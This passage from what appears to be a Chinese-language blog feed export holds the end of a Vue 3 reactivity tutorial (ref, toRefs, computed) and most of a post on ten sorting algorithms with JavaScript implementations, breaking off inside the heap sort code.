punctuation">}</span>  <span class="token keyword">return</span> r<span class="token punctuation">}</span></code></pre><p><strong>ref测试</strong></p><pre class=" language-js"><code class="language-js">    <span class="token keyword">import</span> <span class="token punctuation">{</span> reactive<span class="token punctuation">,</span> effect<span class="token punctuation">,</span> ref <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./reactivity/index.js'</span>    <span class="token keyword">const</span> price <span class="token operator">=</span> <span class="token function">ref</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span>    <span class="token keyword">const</span> count <span class="token operator">=</span> <span class="token function">ref</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token keyword">let</span> total <span class="token operator">=</span> <span class="token number">0</span>     <span class="token function">effect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      total <span class="token operator">=</span> price<span class="token punctuation">.</span>value <span class="token operator">*</span> count<span class="token punctuation">.</span>value    <span class="token punctuation">}</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>total<span class="token punctuation">)</span>    price<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token number">4000</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>total<span class="token punctuation">)</span>    count<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token number">1</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>total<span class="token punctuation">)</span></code></pre><h2 id="reactive-vs-ref"><a href="#reactive-vs-ref" class="headerlink" title="reactive vs ref"></a>reactive vs ref</h2><ul><li>ref 可以把基本数据类型数据，转成响应式对象</li><li>ref 返回的对象，重新赋值成对象也是响应式的</li><li>reactive 返回的对象，重新赋值丢失响应式</li><li>reactive 返回的对象不可以解构</li></ul><h2 id="toRefs"><a href="#toRefs" class="headerlink" title="toRefs"></a>toRefs</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">function</span> toRefs <span class="token punctuation">(</span>proxy<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> ret <span class="token operator">=</span> proxy <span class="token keyword">instanceof</span> <span class="token class-name">Array</span> <span class="token operator">?</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>proxy<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> key <span class="token keyword">in</span> proxy<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 把每个属性都转换成 ref 对象</span>    ret<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">toProxyRef</span><span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> key<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> ret<span class="token punctuation">}</span><span class="token keyword">function</span> toProxyRef <span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> key<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> r <span class="token operator">=</span> <span class="token punctuation">{</span>    __v_isRef<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token keyword">get</span> value <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// 访问的已经是响应式对象，不需要收集依赖</span>      <span class="token keyword">return</span> proxy<span class="token punctuation">[</span>key<span class="token punctuation">]</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token keyword">set</span> value <span class="token punctuation">(</span>newValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>      proxy<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> newValue    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> r<span class="token punctuation">}</span></code></pre><p><strong>toRefs测试</strong></p><pre class=" language-js"><code class="language-js"><span class="token keyword">import</span> <span class="token punctuation">{</span> reactive<span class="token punctuation">,</span> effect<span class="token punctuation">,</span> toRefs <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./reactivity/index.js'</span><span class="token keyword">function</span> useProduct <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> product <span class="token operator">=</span> <span class="token function">reactive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    name<span class="token punctuation">:</span> <span class="token string">'iPhone'</span><span class="token punctuation">,</span>    price<span class="token punctuation">:</span> <span class="token number">5000</span><span class="token punctuation">,</span>    count<span class="token punctuation">:</span> <span class="token number">3</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 直接返回 product 解构之后不是响应式的</span>  <span class="token comment" spellcheck="true">// toRefs 将每个属性转换成了响应式，解构之后依旧是响应式</span>  <span class="token keyword">return</span> <span class="token function">toRefs</span><span class="token punctuation">(</span>product<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">const</span> <span class="token punctuation">{</span> price<span class="token punctuation">,</span> count <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">useProduct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">let</span> total <span class="token operator">=</span> <span class="token number">0</span> <span class="token function">effect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  total <span class="token operator">=</span> price<span class="token punctuation">.</span>value <span class="token operator">*</span> count<span class="token punctuation">.</span>value<span class="token punctuation">}</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>total<span class="token punctuation">)</span>price<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token number">4000</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>total<span class="token punctuation">)</span>count<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token number">1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>total<span class="token punctuation">)</span></code></pre><h2 id="computed"><a href="#computed" class="headerlink" title="computed"></a>computed</h2><blockquote><p>Computed 实际上就是一个 effect 函数，computed 返回的是一个 ref 对象。</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 返回 ref 创建的对象</span><span class="token keyword">export</span> <span class="token keyword">function</span> computed <span class="token punctuation">(</span>getter<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token function">ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token function">effect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">(</span>result<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token function">getter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> result<span class="token punctuation">}</span></code></pre><p><strong>computed测试</strong></p><pre class=" language-js"><code class="language-js"><span class="token keyword">import</span> <span class="token punctuation">{</span> reactive<span class="token punctuation">,</span> effect<span class="token punctuation">,</span> computed <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./reactivity/index.js'</span><span class="token keyword">const</span> product <span class="token operator">=</span> <span class="token function">reactive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  name<span class="token punctuation">:</span> <span class="token string">'iPhone'</span><span class="token punctuation">,</span>  price<span class="token punctuation">:</span> <span class="token number">5000</span><span class="token punctuation">,</span>  count<span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">let</span> total <span class="token operator">=</span> <span class="token function">computed</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> product<span class="token punctuation">.</span>price <span class="token operator">*</span> product<span class="token punctuation">.</span>count<span class="token punctuation">}</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>total<span class="token punctuation">.</span>value<span class="token punctuation">)</span>product<span class="token punctuation">.</span>price <span class="token operator">=</span> <span class="token number">4000</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>total<span class="token punctuation">.</span>value<span class="token punctuation">)</span>product<span class="token punctuation">.</span>count <span class="token operator">=</span> <span class="token number">1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>total<span class="token punctuation">.</span>value<span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>十大排序算法</title>
      <link href="2020/12/17/%E7%AE%97%E6%B3%95-%E5%8D%81%E5%A4%A7%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"/>
      <url>2020/12/17/%E7%AE%97%E6%B3%95-%E5%8D%81%E5%A4%A7%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<ul><li>冒泡排序</li><li>选择排序</li><li>插入排序</li><li>希尔排序</li><li>归并排序</li><li>快速排序</li><li>堆排序</li><li>计数排序</li><li>桶排序</li><li>基数排序</li></ul><p>参考文章：<a href="https://juejin.cn/post/6844903444365443080#heading-38" target="_blank" rel="noopener">十大经典排序算法总结（JavaScript描述）</a></p><h2 id="常用术语"><a href="#常用术语" class="headerlink" title="常用术语"></a>常用术语</h2><p><strong>稳定</strong>：如果a原本在b前面，而a=b，排序之后a仍然在b的前面； </p><p><strong>不稳定</strong>：如果a原本在b的前面，而a=b，排序之后a可能会出现在b的后面；</p><p><strong>内排序</strong>：所有排序操作都在内存中完成； </p><p><strong>外排序</strong>：由于数据太大，因此把数据放在磁盘中，而排序通过磁盘和内存的数据传输才能进行；</p><p><strong>时间复杂度</strong>: 一个算法执行所耗费的时间。</p><p><strong>空间复杂度</strong>: 运行完一个程序所需内存的大小。</p><p><img src="https://static001.geekbang.org/infoq/26/26d77c968c576919964853afd90eb6bc.png" alt="img"></p><h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><ol><li>比较相邻的元素。如果第一个比第二个大，就交换他们两个。</li><li>对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。这步做完后，最后的元素会是最大的数。</li><li>针对所有的元素重复以上的步骤，除了最后一个。</li><li>持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较</li></ol><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">bubbleSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> len <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> len <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//相邻元素两两对比</span>                <span class="token keyword">var</span> temp <span class="token operator">=</span> arr<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//元素交换</span>                arr<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>                arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> arr<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><ol><li>在未排序序列中找到最小（大）元素，存放到排序序列的起始位置</li><li>从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾</li><li>以此类推，直到所有元素均排序完毕</li></ol><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">selectionSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> len <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">var</span> minIndex<span class="token punctuation">,</span> temp<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        minIndex <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> j <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> arr<span class="token punctuation">[</span>minIndex<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">//寻找最小的数</span>                minIndex <span class="token operator">=</span> j<span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">//将最小数的索引保存</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        temp <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>minIndex<span class="token punctuation">]</span><span class="token punctuation">;</span>        arr<span class="token punctuation">[</span>minIndex<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> arr<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h2><ol><li>从第一个元素开始，该元素可以认为已经被排序</li><li>取出下一个元素，在已经排序的元素序列中从后向前扫描</li><li>如果该元素（已排序）大于新元素，将该元素移到下一位置</li><li>重复步骤3，直到找到已排序的元素小于或者等于新元素的位置</li><li>将新元素插入到该位置后</li><li>重复步骤2~5</li></ol><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">insertionSort</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> array<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">var</span> key <span class="token operator">=</span> array<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">var</span> j <span class="token operator">=</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> array<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> key<span class="token punctuation">)</span> <span class="token punctuation">{</span>        array<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> array<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        j<span class="token operator">--</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      array<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> array<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h2><ol><li><p>选择一个增量序列t1，t2，…，tk，其中ti&gt;tj，tk=1；</p></li><li><p>按增量序列个数k，对序列进行k 趟排序；</p></li><li><p>每趟排序，根据对应的增量ti，将待排序列分割成若干长度为m 的子序列，分别对各子表进行直接插入排序。仅增量因子为1 时，整个序列作为一个表来处理，表长度即为整个序列的长度。</p></li></ol><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">shellSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> len <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">,</span>        temp<span class="token punctuation">,</span>        gap <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>gap <span class="token operator">&lt;</span> len<span class="token operator">/</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token comment" spellcheck="true">//动态定义间隔序列</span>        gap <span class="token operator">=</span>gap<span class="token operator">*</span><span class="token number">5</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>gap<span class="token punctuation">;</span> gap <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> gap <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>gap<span class="token operator">/</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> gap<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            temp <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> j <span class="token operator">=</span> i<span class="token operator">-</span>gap<span class="token punctuation">;</span> j <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> temp<span class="token punctuation">;</span> j<span class="token operator">-</span><span class="token operator">=</span>gap<span class="token punctuation">)</span> <span class="token punctuation">{</span>                arr<span class="token punctuation">[</span>j<span class="token operator">+</span>gap<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            arr<span class="token punctuation">[</span>j<span class="token operator">+</span>gap<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> arr<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><blockquote><p>归并排序是建立在归并操作上的一种有效的排序算法。该算法是采用分治法（Divide and Conquer）的一个非常典型的应用。归并排序是一种稳定的排序方法。将已有序的子序列合并，得到完全有序的序列；即先使每个子序列有序，再使子序列段间有序。若将两个有序表合并成一个有序表，称为2-路归并。</p></blockquote><ol><li><p>把长度为n的输入序列分成两个长度为n/2的子序列；</p></li><li><p>对这两个子序列分别采用归并排序；</p></li><li><p>将两个排序好的子序列合并成一个最终的排序序列。</p></li></ol><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">mergeSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//采用自上而下的递归方法</span>    <span class="token keyword">var</span> len <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>len <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> arr<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">var</span> middle <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>len <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        left <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> middle<span class="token punctuation">)</span><span class="token punctuation">,</span>        right <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>middle<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token function">mergeSort</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">mergeSort</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>left<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> right<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>left<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> right<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>left<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>right<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>left<span class="token punctuation">.</span>length<span class="token punctuation">)</span>        result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>left<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>right<span class="token punctuation">.</span>length<span class="token punctuation">)</span>        result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>right<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 快排的基本思想是分治，选择一个枢纽，小的放它左面，大的右面，这样pivot放在了最终位置</span><span class="token comment" spellcheck="true">// 然后再对pivot左右两个子表排序</span><span class="token comment" spellcheck="true">// 下面为一趟排序过程，以4为枢纽</span><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">function</span> <span class="token function">sort</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">let</span> low <span class="token operator">=</span> <span class="token number">0</span>  <span class="token keyword">let</span> high <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token number">-1</span>  <span class="token keyword">let</span> pivot <span class="token operator">=</span> arr<span class="token punctuation">[</span>low<span class="token punctuation">]</span>  <span class="token keyword">while</span><span class="token punctuation">(</span>low <span class="token operator">&lt;</span> high<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>low <span class="token operator">&lt;</span> high <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>high<span class="token punctuation">]</span> <span class="token operator">>=</span> pivot<span class="token punctuation">)</span> <span class="token operator">--</span>high    arr<span class="token punctuation">[</span>low<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>high<span class="token punctuation">]</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>low <span class="token operator">&lt;</span> high <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>low<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> pivot<span class="token punctuation">)</span> <span class="token operator">++</span>low    arr<span class="token punctuation">[</span>high<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>low<span class="token punctuation">]</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  arr<span class="token punctuation">[</span>low<span class="token punctuation">]</span><span class="token operator">=</span>pivot<span class="token punctuation">}</span><span class="token function">sort</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//[1, 2, 3, 4, 5, 6, 8, 7]</span><span class="token comment" spellcheck="true">//过程如下，最终小于4的在左面，大于4的在右面</span><span class="token comment" spellcheck="true">// [4, 7, 6, 5, 3, 2, 8, 1]</span><span class="token comment" spellcheck="true">// [1, 7, 6, 5, 3, 2, 8, 7]</span><span class="token comment" spellcheck="true">// [1, 2, 6, 5, 3, 6, 8, 7]</span><span class="token comment" spellcheck="true">// [1, 2, 3, 5, 5, 6, 8, 7]</span><span class="token comment" spellcheck="true">// [1, 2, 3, 5, 5, 6, 8, 7]</span><span class="token comment" spellcheck="true">// [1, 2, 3, 4, 5, 6, 8, 7]</span><span class="token comment" spellcheck="true">//优化：</span><span class="token comment" spellcheck="true">// 1.子序列的规模较小时，不用在递归调用快排，可以采取直接插入排序</span><span class="token comment" spellcheck="true">// 2.尽量选一个可以将数据中分的枢纽元素，比如从序列的头，中，尾选3个，取这三个值的中间元素为枢纽</span></code></pre><h2 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h2><ol><li>将待排序序列构成一个大顶堆，此时，整个序列的最大值就是堆顶的根节点</li><li>将其与末尾元素进行交换，此时末尾就是最大值</li><li>然后将剩余n-1个元素重新构造成一个堆，就会得到n个元素的次小值，如此反复执行，便能得到一个有序序列</li></ol><ul><li><a href="https://user-gold-cdn.xitu.io/2016/11/29/d1ac550a097055f65ed10a50d408f40d?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" target="_blank" rel="noopener">堆排序图示</a></li></ul><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">/*方法说明：堆排序@param  array 待排序数组*/</span><span class="token keyword">function</span> <span class="token function">heapSort</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 建堆</span>    <span class="token keyword">var</span> heapSize <span class="token operator">=</span> array<span class="token punctuation">.</span>length<span class="token punctuation">,</span> temp<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>heapSize <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span 